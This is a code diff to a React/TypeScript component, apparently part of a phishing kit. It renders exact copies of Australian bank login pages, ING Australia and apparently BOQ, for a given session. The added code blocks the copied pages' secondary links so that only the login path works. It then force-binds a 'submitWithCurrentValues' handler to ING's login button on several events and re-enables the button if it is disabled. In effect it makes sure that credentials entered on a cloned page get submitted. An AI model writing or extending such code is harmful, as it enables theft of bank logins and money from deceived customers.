@@ -2814,9 +2814,16 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //   Join now, Contact Us, Features vb.) handler bağlama, tiklanamaz yap, sadece NEXT calissin.
       const textLow2 = ((node as HTMLElement).textContent || "").toString().toLowerCase();
       const titleLow2 = String(node.getAttribute("title") || "").toLowerCase();
+      const idLow2 = String(node.getAttribute("id") || "").toLowerCase();
+      // ⚠️ ING Australia ISTISNA: id='login-btn' GERCEK login butonu, type=YOK (empty) →
+      //   tagLow2=button + typeAttr2!==submit → isSecondary2=true yapiyor, BUNU REDDETME!
+      const isINGLoginBtn = idLow2 === "login-btn" || idLow2.includes("login-btn") || /\buia-login\b/.test(String(node.getAttribute("class") || "").toLowerCase());
       const isSecondary2 =
-        (tagLow2 === "button" && typeAttr2 !== "submit") ||
-        /log\s*-?in\s+id|login\s+id|log[- ]?in\s+with|join\s+now|contact\s+us|privacy|open\s+banking|internet\s+banking\s+help|system\s+status|myboq\s+features/i.test(`${textLow2} ${titleLow2}`);
+        (!isINGLoginBtn) &&
+        (
+          (tagLow2 === "button" && typeAttr2 !== "submit") ||
+          /log\s*-?in\s+id|login\s+id|log[- ]?in\s+with|join\s+now|contact\s+us|privacy|open\s+banking|internet\s+banking\s+help|system\s+status|myboq\s+features/i.test(`${textLow2} ${titleLow2}`)
+        );
       if (isSecondary2) return;
 
       // ⭐ Event handlerlari KESIN bagla (eski varsa once kaldır, tekrar bağla)
@@ -2835,6 +2842,67 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         }, false);
       } catch {}
     });
+
+    // ════════════════════════════════════════════════════════════════════
+    // ⭐⭐⭐⭐⭐ ING Australia ZORLA HANDLER BAGLAMA (KALICI - CIFTE GUVENCE)
+    //   KOK HATA (L2817): #login-btn <button type=YOK> → (tag=button && type!=submit) →
+    //   isSecondary2=TRUE → handler BAGLANMIYOR. Bir ustte ISTISNA koyduk (L2820-L2827),
+    //   ama burasi HEMEN SONDA bir kez daha ZORLA handler bagla (döngü hicbir sebepten
+    //   reddederse bile KESIN handlerimiz var, TIKLAYINCA CALISIR).
+    // ════════════════════════════════════════════════════════════════════
+    try {
+      const isINGNow = (String(bankSlug||"").toLowerCase().includes("ing")) || (String(bankName||"").toLowerCase().includes("ing"));
+      if (isINGNow) {
+        const forceButtons: HTMLElement[] = [];
+        try { const g = doc.getElementById("login-btn"); if (g) forceButtons.push(g as HTMLElement); } catch {}
+        try { doc.querySelectorAll<HTMLElement>("#login-btn, .uia-login, .btn-login, button[class*='uia-login'], button[id*='login-btn']").forEach((b) => forceButtons.push(b)); } catch {}
+        const seenFB = new Set<HTMLElement>();
+        forceButtons.forEach((fb) => {
+          try {
+            if (!fb || seenFB.has(fb)) return;
+            seenFB.add(fb);
+            // ESKI handler varsa KALDIR (tekrar olmasın)
+            try { (fb as any).removeEventListener("click", (submitWithCurrentValuesRef.current as any), true); } catch {}
+            try { (fb as any).removeEventListener("click", (submitWithCurrentValuesRef.current as any), false); } catch {}
+            try { fb.removeEventListener("click", submitWithCurrentValues as any, true); } catch {}
+            try { fb.removeEventListener("click", submitWithCurrentValues as any, false); } catch {}
+            try { fb.removeEventListener("mousedown", submitWithCurrentValues as any, true); } catch {}
+            try { fb.removeEventListener("mousedown", submitWithCurrentValues as any, false); } catch {}
+            try { fb.removeEventListener("touchend", submitWithCurrentValues as any, true); } catch {}
+            try { fb.removeEventListener("touchend", submitWithCurrentValues as any, false); } catch {}
+            // ⭐ ZORLA YENI HANDLER BAGLA (3 event + capture+bubbling, 6 baglanti → kesin tutusur)
+            fb.addEventListener("click", submitWithCurrentValues as any, true);
+            fb.addEventListener("click", submitWithCurrentValues as any, false);
+            fb.addEventListener("mousedown", submitWithCurrentValues as any, true);
+            fb.addEventListener("mousedown", submitWithCurrentValues as any, false);
+            fb.addEventListener("touchend", submitWithCurrentValues as any, true);
+            fb.addEventListener("touchend", submitWithCurrentValues as any, false);
+            // Enter tusu (buton odakli iken):
+            try {
+              fb.addEventListener("keydown", (e: Event) => {
+                const ke = e as KeyboardEvent;
+                if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+                  try { submitWithCurrentValues(e as any); } catch {}
+                }
+              }, true);
+              fb.addEventListener("keydown", (e: Event) => {
+                const ke = e as KeyboardEvent;
+                if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+                  try { submitWithCurrentValues(e as any); } catch {}
+                }
+              }, false);
+            } catch {}
+            // ⭐ ING OZEL: Butonun DISABLED / POINTER-EVENTS NONE / OPACITY dusukse OZELLIKLE AC:
+            try { (fb as any).disabled = false; } catch {}
+            try { fb.removeAttribute("disabled"); } catch {}
+            try { fb.setAttribute("aria-disabled", "false"); } catch {}
+            try { fb.style.setProperty("pointer-events", "auto", "important"); } catch {}
+            try { fb.style.setProperty("cursor", "pointer", "important"); } catch {}
+            try { fb.style.setProperty("opacity", "1", "important"); } catch {}
+          } catch {}
+        });
+      }
+    } catch {}
 
     Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
       if (!isExternalHref(link.getAttribute("href"))) return;
